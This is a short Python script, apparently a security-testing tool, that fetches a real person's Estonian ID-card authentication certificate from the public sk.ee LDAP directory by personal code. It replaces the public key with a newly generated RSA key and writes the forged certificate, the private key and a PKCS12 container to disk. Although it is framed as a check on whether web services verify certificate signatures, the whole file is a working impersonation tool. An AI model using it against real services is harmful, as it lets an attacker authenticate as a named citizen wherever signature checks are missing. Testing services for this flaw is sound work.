'''

The script downloads (publicly available) certificate and replaces 
the public key component in the certificate with a generated public key.

Script can be used to verify that web service is checking the signature (integrity) of the proposed certificate.

(c) 2017 Tiit Hallas (hallas@neti.ee)

'''

import argparse
import sys
import ldap
import getpass
import OpenSSL
from pyasn1.codec.der import decoder, encoder

def get_cert(ssn):
    # download persons certificate from sk.ee LDAP server
    print "[+] Connecting to ldap://ldap.sk.ee"
    l = ldap.initialize("ldap://ldap.sk.ee")
    l.simple_bind_s("","")
    print "[+] Searching: OU=authentication,O=ESTEID,C=EE,serialNumber=%s" % (ssn)
    r = l.search_s("OU=authentication,O=ESTEID,C=EE", ldap.SCOPE_SUBTREE, "serialNumber=%s" % ssn)
    if not len(r):
        print "[-] Certificate not found"
        sys.exit()
    for dn, certificate in r:
        cert = certificate['userCertificate;binary'][0]
        print "[+] Found certificate:", certificate['cn'][0]
        open(ssn+'_original_certificate.cer','wb').write(cert)
        return cert

def generate_keypair(der_data):
    cert = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_ASN1, der_data)
    keysize = cert.get_pubkey().bits()
    print "[+] Generating %s-bit RSA key..." % (keysize)
    new_key = OpenSSL.crypto.PKey()
    new_key.generate_key(OpenSSL.crypto.TYPE_RSA, keysize)
    new_pub = OpenSSL.crypto.dump_publickey(OpenSSL.crypto.FILETYPE_ASN1, new_key)
    print "[+] Replacing public key in the certificate"
    decoded_cert, sitt = decoder.decode(der_data)
    decoded_cert[0][6] = decoder.decode(new_pub)[0]
    new_cert = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_ASN1, encoder.encode(decoded_cert))
    return new_cert, new_key

parser = argparse.ArgumentParser(description='Generate fake ID-card auth. certificate')
parser.add_argument('ssn', type=str, help='Personal code of the person')
parser.add_argument('-passwd', required=False, type=str, help='PKCS12 container password')
args = parser.parse_args()



cert = get_cert(args.ssn)
cert, key = generate_keypair(cert)

print "[+] Saving certificate and the private key to files"
open( args.ssn+"_certificate.cer", 'w' ).write( 
          OpenSSL.crypto.dump_certificate( OpenSSL.crypto.FILETYPE_PEM, cert ) )
open( args.ssn+"_private_key.pem", 'w' ).write( 
          OpenSSL.crypto.dump_privatekey( OpenSSL.crypto.FILETYPE_PEM, key ) )

print "[+] Generating PKCS12 container"
p12 = OpenSSL.crypto.PKCS12()
p12.set_privatekey( key )
p12.set_certificate( cert )
if args.passwd is None:
    password = getpass.getpass("[?] PKCS12 export password:")
else:
    password = args.passwd

open( args.ssn+".pfx", 'wb' ).write( p12.export(password) ) 
print "[+] Done."
